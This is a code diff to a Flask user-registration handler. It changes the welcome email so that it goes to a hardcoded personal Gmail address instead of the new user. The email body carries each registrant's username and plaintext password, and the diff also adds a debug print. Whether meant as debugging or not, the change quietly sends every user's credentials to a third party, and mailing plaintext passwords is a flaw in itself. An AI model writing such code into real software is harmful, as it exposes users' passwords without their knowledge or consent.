@@ -40,12 +40,13 @@ def register():
     if AuthRepository.get_id_by_username(name) is not None:
         return make_response(jsonify({'code': 400, 'message': message.ACOUNT_EXIST}), 400)
     if AuthRepository.get_id_by_email(email) is not None:
+        print AuthRepository.get_id_by_email(email)
         return make_response(jsonify({'code': 400, 'message': message.EMAIL_EXIST}), 400)
 
     pw_hashed = bcrypt.generate_password_hash(req["password"]).decode('utf-8').encode('ascii', 'ignore')
     AuthRepository.add_user(name, email, pw_hashed)
 
-    msg = Message('Your account info', sender='accrac016@gmail.com', recipients=[email])
+    msg = Message('Your account info', sender='accrac016@gmail.com', recipients=['thainq00@gmail.com'])
     msg.body = "username: " + name + " pass: " + pw
     mail.send(msg)
     return jsonify({'code': 200, 'message': message.CREATE_ACCOUNT})
